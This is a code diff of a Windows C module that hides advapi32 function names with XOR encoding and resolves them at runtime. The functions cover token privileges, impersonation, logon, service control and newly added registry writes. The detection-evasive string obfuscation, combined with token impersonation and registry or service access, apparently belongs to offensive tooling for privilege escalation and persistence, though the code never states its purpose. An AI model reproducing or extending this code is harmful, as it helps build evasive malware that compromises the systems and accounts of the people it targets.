@@ -5,18 +5,12 @@
 static adv_api_t _adv;
 static int       _adv_ok = 0;
 
-static void _xdec(const unsigned char *enc, size_t n, char *out) {
-    volatile unsigned char k = EVS_KEY;
-    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ k);
-    out[n] = '\0';
-}
-
 const adv_api_t *adv_get(void)
 {
     if (_adv_ok) return &_adv;
 
     char dll[16], fn[40];
-    _xdec(EVS_dll_advapi32, sizeof(EVS_dll_advapi32), dll);
+    EVS_D(dll, EVS_dll_advapi32);
     HMODULE h = LoadLibraryA(dll);
     SecureZeroMemory(dll, sizeof(dll));
     if (!h) return &_adv;
@@ -24,6 +18,7 @@ const adv_api_t *adv_get(void)
     struct { const unsigned char *enc; size_t n; void **p; } t[] = {
         { EVS_fn_AdjustTokenPrivileges,     sizeof(EVS_fn_AdjustTokenPrivileges),     (void **)&_adv.AdjustTokenPrivileges        },
         { EVS_fn_DuplicateTokenEx,          sizeof(EVS_fn_DuplicateTokenEx),          (void **)&_adv.DuplicateTokenEx             },
+        { EVS_fn_GetTokenInformation,       sizeof(EVS_fn_GetTokenInformation),       (void **)&_adv.GetTokenInformation          },
         { EVS_fn_ImpersonateLoggedOnUser,   sizeof(EVS_fn_ImpersonateLoggedOnUser),   (void **)&_adv.ImpersonateLoggedOnUser      },
         { EVS_fn_LogonUserA,                sizeof(EVS_fn_LogonUserA),                (void **)&_adv.LogonUserA                   },
         { EVS_fn_LookupPrivilegeNameA,      sizeof(EVS_fn_LookupPrivilegeNameA),      (void **)&_adv.LookupPrivilegeNameA         },
@@ -31,6 +26,8 @@ const adv_api_t *adv_get(void)
         { EVS_fn_OpenProcessToken,          sizeof(EVS_fn_OpenProcessToken),          (void **)&_adv.OpenProcessToken             },
         { EVS_fn_OpenThreadToken,           sizeof(EVS_fn_OpenThreadToken),           (void **)&_adv.OpenThreadToken              },
         { EVS_fn_RevertToSelf,              sizeof(EVS_fn_RevertToSelf),              (void **)&_adv.RevertToSelf                 },
+        { EVS_fn_RegCreateKeyExA,           sizeof(EVS_fn_RegCreateKeyExA),           (void **)&_adv.RegCreateKeyExA              },
+        { EVS_fn_RegSetValueExA,            sizeof(EVS_fn_RegSetValueExA),            (void **)&_adv.RegSetValueExA               },
         { EVS_fn_CloseServiceHandle,        sizeof(EVS_fn_CloseServiceHandle),        (void **)&_adv.CloseServiceHandle           },
         { EVS_fn_EnumServicesStatusExA,     sizeof(EVS_fn_EnumServicesStatusExA),     (void **)&_adv.EnumServicesStatusExA        },
         { EVS_fn_OpenSCManagerA,            sizeof(EVS_fn_OpenSCManagerA),            (void **)&_adv.OpenSCManagerA               },
@@ -40,8 +37,8 @@ const adv_api_t *adv_get(void)
         { EVS_fn_SetServiceStatus,          sizeof(EVS_fn_SetServiceStatus),          (void **)&_adv.SetServiceStatus             },
         { EVS_fn_StartServiceCtrlDispatcherA,sizeof(EVS_fn_StartServiceCtrlDispatcherA),(void **)&_adv.StartServiceCtrlDispatcherA},
     };
-    for (int i = 0; i < 17; i++) {
-        _xdec(t[i].enc, t[i].n, fn);
+    for (int i = 0; i < 20; i++) {
+        _evs_dec(fn, t[i].enc, t[i].n);
         *t[i].p = (void *)GetProcAddress(h, fn);
         SecureZeroMemory(fn, t[i].n + 1);
     }
